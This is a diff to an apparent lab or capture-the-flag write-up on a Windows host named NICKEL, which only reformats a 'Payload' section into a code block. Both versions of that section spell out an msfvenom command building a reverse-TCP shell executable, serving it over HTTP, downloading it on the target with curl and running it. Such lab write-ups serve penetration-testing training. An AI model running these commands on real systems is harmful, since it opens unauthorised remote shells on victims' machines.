@@ -403,40 +403,42 @@ Active Connections
   (c) 2019 Microsoft Corporation. All rights reserved.
 ```
 #### Payload
+```
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.194 LPORT=1000 -f exe -o payload.exe
+  python3 -m http.server 1000
+  Serving HTTP on 0.0.0.0 port 1000 (http://0.0.0.0:1000/) ...
+  192.168.243.99 - - [06/Aug/2026 10:34:38] "GET /payload.exe HTTP/1.1" 200 -
 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.194 LPORT=1000 -f exe -o payload.exe
-python3 -m http.server 1000
-Serving HTTP on 0.0.0.0 port 1000 (http://0.0.0.0:1000/) ...
-192.168.243.99 - - [06/Aug/2026 10:34:38] "GET /payload.exe HTTP/1.1" 200 -
+  ariah@NICKEL C:\Users\ariah>curl 192.168.45.194:1000/payload.exe -o payload.exe
+    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                  Dload  Upload   Total   Spent    Left  Speed
+  100  7680  100  7680    0     0   7680      0  0:00:01 --:--:--  0:00:01 19692
 
-ariah@NICKEL C:\Users\ariah>curl 192.168.45.194:1000/payload.exe -o payload.exe
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100  7680  100  7680    0     0   7680      0  0:00:01 --:--:--  0:00:01 19692
+  ariah@NICKEL C:\Users\ariah>dir
+  Volume in drive C has no label.
+  Volume Serial Number is 9451-68F7
 
-ariah@NICKEL C:\Users\ariah>dir
- Volume in drive C has no label.
- Volume Serial Number is 9451-68F7
+  Directory of C:\Users\ariah
 
- Directory of C:\Users\ariah
+  08/05/2026  10:04 PM    <DIR>          .
+  08/05/2026  10:04 PM    <DIR>          ..
+  10/15/2020  07:23 AM    <DIR>          3D Objects
+  10/15/2020  07:23 AM    <DIR>          Contacts
+  04/14/2022  04:46 AM    <DIR>          Desktop
+  10/15/2020  07:23 AM    <DIR>          Documents
+  10/15/2020  07:23 AM    <DIR>          Downloads
+  10/15/2020  07:23 AM    <DIR>          Favorites
+  10/15/2020  07:23 AM    <DIR>          Links
+  10/15/2020  07:23 AM    <DIR>          Music
+  08/05/2026  10:04 PM             7,680 payload.exe
+  10/15/2020  07:25 AM    <DIR>          Pictures
+  10/15/2020  07:23 AM    <DIR>          Saved Games
+  10/15/2020  07:24 AM    <DIR>          Searches
+  10/15/2020  07:23 AM    <DIR>          Videos
+                1 File(s)          7,680 bytes
+                14 Dir(s)   7,659,692,032 bytes free
 
-08/05/2026  10:04 PM    <DIR>          .
-08/05/2026  10:04 PM    <DIR>          ..
-10/15/2020  07:23 AM    <DIR>          3D Objects
-10/15/2020  07:23 AM    <DIR>          Contacts
-04/14/2022  04:46 AM    <DIR>          Desktop
-10/15/2020  07:23 AM    <DIR>          Documents
-10/15/2020  07:23 AM    <DIR>          Downloads
-10/15/2020  07:23 AM    <DIR>          Favorites
-10/15/2020  07:23 AM    <DIR>          Links
-10/15/2020  07:23 AM    <DIR>          Music
-08/05/2026  10:04 PM             7,680 payload.exe
-10/15/2020  07:25 AM    <DIR>          Pictures
-10/15/2020  07:23 AM    <DIR>          Saved Games
-10/15/2020  07:24 AM    <DIR>          Searches
-10/15/2020  07:23 AM    <DIR>          Videos
-               1 File(s)          7,680 bytes
-              14 Dir(s)   7,659,692,032 bytes free
+  ariah@NICKEL C:\Users\ariah>payload.exe
+  ariah@NICKEL C:\Users\ariah>
 
-ariah@NICKEL C:\Users\ariah>payload.exe
-ariah@NICKEL C:\Users\ariah>
+```
